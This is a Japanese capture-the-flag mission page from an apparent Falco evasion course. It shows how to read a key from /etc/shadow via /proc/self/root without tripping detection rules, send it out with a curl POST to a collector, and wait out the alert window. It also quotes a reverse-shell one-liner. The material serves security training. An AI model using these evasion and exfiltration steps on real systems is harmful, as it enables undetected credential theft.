# シナリオ

CTF Company の **master key** にようやく手が届いた。だが「読む」だけ
では任務は終わらない — 鍵を **箱の外の drop server へ持ち出して**
初めて exfiltration 完遂だ。そして CTF Company の Falco は読み取り・
探索・shell・永続化・C2・hardlink の **全方位** を見張っている。
**静かに読み、静かに持ち出せ。**

# ゴール

3 段すべてを満たすと solve:

  (1) master key を **発火させずに読む**
      /etc/shadow 末尾の `# CTF_MASTER_KEY:` 行 (Read-sensitive = 禁止)
  (2) 読んだ flag を **drop server (collector) へ HTTP で持ち出す**
  (3) `submit` で完了 — 直前 30 秒に 7 つの禁止ルールが 1 つも発火して
      おらず、かつ (2) の exfil が記録済みであること

# 持ち出しの作法 (ここが本番)

ここまでの Mission で「何が発火するか」は学んだ。**派手な持ち出しは
すべて餌食**:

  reverse shell で抜く (bash -i >& /dev/tcp/...)   → C2 (Mission 08) 発火
  自前の exfil バイナリを drop して実行             → Drop+exec (Mission 07) 発火
  鍵を grep/find で漁る・hardlink で退避            → Search(04)/Hardlink(09) 発火

正解は **既存の curl で静かな HTTP POST**。collector は HTTP しか
受け付けないので、そもそも reverse shell では 1 バイトも届かない。

  collector(drop server):
    ${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil
  payload (JSON):
    {"user":"${FALCO_CTF_USER}","flag":"FALCO{...}"}

# 提出方法

  source /opt/ctf/submit.sh
  submit 10-final-exfil 'FALCO{...}'

レスポンス:
  {"correct":true,"evaded":true,"solved":true,...}      ← Operation 完遂
  {"correct":true,"evaded":false,"reason":"...30s..."}   ← window 内で発火
  {"correct":true,"exfiltrated":false,"reason":"..."}    ← exfil 未完了(先に collector へ)
  {"correct":false,"reason":"flag mismatch"}             ← flag 違い

────────────────────────────────────────────────────────────────────
HINT 1 (気付き): 「読む」だけでは終わらない
────────────────────────────────────────────────────────────────────

任務は master key を **箱の外へ持ち出す** こと。だが reverse shell や
自前ツールの投下といった派手な exfil は、Mission 07/08 で見たとおり
Falco の餌食になる。「どう静かに外へ出すか」が問われている。

────────────────────────────────────────────────────────────────────
HINT 2 (概要): 静かに読む + 静かに送る
────────────────────────────────────────────────────────────────────

  読む  : Read-sensitive を /proc/self/root で回避 (Mission 03)
  送る  : reverse shell(C2/08)も drop+exec(07)も踏まず、**既存の curl**
          で collector へ HTTP POST。collector は HTTP のみ受信するので
          curl が唯一の現実解。

その後 30 秒静かに待ってから submit (過去の発火を window から抜く)。

────────────────────────────────────────────────────────────────────
HINT 3 (解答): 読む → curl で exfil → 30 秒 → submit
────────────────────────────────────────────────────────────────────

  # 1) 発火させずに読む (Mission 03)
  FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')

  # 2) 既存 curl で collector へ静かに持ち出す
  curl -s "${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil" \
    -H 'Content-Type: application/json' \
    -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"

  # 3) 30 秒何もせず待ってから提出
  source /opt/ctf/submit.sh
  submit 10-final-exfil "${FLAG}"
